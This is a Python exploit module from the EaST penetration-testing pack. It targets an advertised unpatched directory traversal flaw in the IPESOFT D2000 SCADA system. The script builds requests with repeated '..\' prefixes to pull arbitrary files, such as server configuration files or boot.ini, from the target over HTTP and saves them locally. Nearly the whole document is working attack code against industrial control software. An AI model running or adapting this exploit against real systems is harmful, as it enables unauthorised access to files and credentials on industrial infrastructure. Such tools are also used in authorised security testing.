#!/usr/bin/env python
# The exploit is a part of EaST pack - use only under the license agreement
# specified in LICENSE.txt in your EaST distribution
import sys
import urllib2
import time

sys.path.append("./core")
from Sploit import Sploit

INFO = {}
INFO['NAME'] = "efs_IPESOFT_D2000_SCADA_DirTrav"
INFO['DESCRIPTION'] = "IPESOFT D2000 SCADA Directory Traversal 0-day"
INFO['VENDOR'] = "http://www.ipesoft.com/en/"
INFO["CVE Name"] = "0-day"
INFO["NOTES"] = """
IPESOFT D2000 is an object-oriented SCADA
(Supervisory Control And Data Acquisition) system,
as well as a platform for creating comprehensive
MES (Manufacturing Execution System) applications.
With all its features, it represents an optimized
tool of the RAD (Rapid Application Development)
category designed for information systems handling
simultaneously real-time technical data, timeline
technical and trading data and trading data in the database charts.
"""

INFO['CHANGELOG'] = "13 Jan 2016. Written by Gleg team."
INFO['PATH'] = 'Exploits/'

# Must be in every module, to be set by framework
OPTIONS = {}
OPTIONS["HOST"] = '127.0.0.1'
OPTIONS["PORT"] = '7074'
OPTIONS["SSL"] = False
OPTIONS["FILENAME"] = '\\standalone\\configuration\\standalone.xml'

class exploit(Sploit):
    def __init__(self, host="", port=0, ssl=False,
        file_name="\\standalone\\configuration\\standalone.xml",
            logger = None):
        Sploit.__init__(self, logger=logger)
        self.name = INFO['NAME']
        self.ssl = ssl
        self.protocol = "https" if self.ssl else "http"
        self.port = port
        self.host = host
        self.filename = file_name
        self.state = "running"
        return

    def args(self):
        self.args = Sploit.args(self, OPTIONS)
        self.host = self.args.get('HOST', self.host)
        self.port = int(self.args.get('PORT', self.port))
        self.ssl = self.args.get("SSL", self.ssl)
        self.protocol = "https" if self.ssl else "http"
        self.filename = self.args.get('FILENAME', 'boot.ini')
        return

    def MakePath(self,f, count):
        a = ""
        for i in xrange(0, count):
            a = a + "..\\"
        return a + f

    def sendGET(self):
        allData = ""
        for i in xrange(0, 32):
            request  = self.protocol + "://" + self.host + ":" + str(self.port)
            request += "/" + self.MakePath(self.filename, i)
            self.log("sending request="+request)
            try:
                data = urllib2.urlopen(request)
                allData = data.read()
                if allData.lower().find("no such file or directory") > -1: continue
                if allData.lower().find("not found") > -1: continue
                self.log('Found ' + self.filename)
                self.log("Found file: " + request)
                break
            except:
                print('Not found')
        #writing the response   
        dirname= "report/"+self.name
        filename= "response_"+time.strftime("%b_%d_%Y_%H-%M-%S", time.gmtime())+".data"
        self.writefile(dirname, filename, allData)
        self.setInfo("response received. check output  files in %s for valuable info"%(dirname))
        return 1

    def writefile(self,dirname,filename,filedata):
        if not os.path.exists(dirname):
            os.makedirs(dirname)
        filepath=dirname+"/"+filename
        fd=file(filepath,"wb+")
        fd.write(filedata)
        fd.close()
        self.log("Wrote to %s"%filepath)
        return 1

    def run(self):
        self.args()
        self.log('Try download file: {}'.format(self.filename))
        if self.sendGET():
            self.finish(1)
        else:
            self.finish(0)


if __name__ == '__main__':
    """
        By now we only have the tool mode for exploit..
        Later we would have standalone mode also.
    """
    print "Running exploit %s .. " % INFO['NAME']
    e = exploit("192.168.0.1", 80)
    e.run()
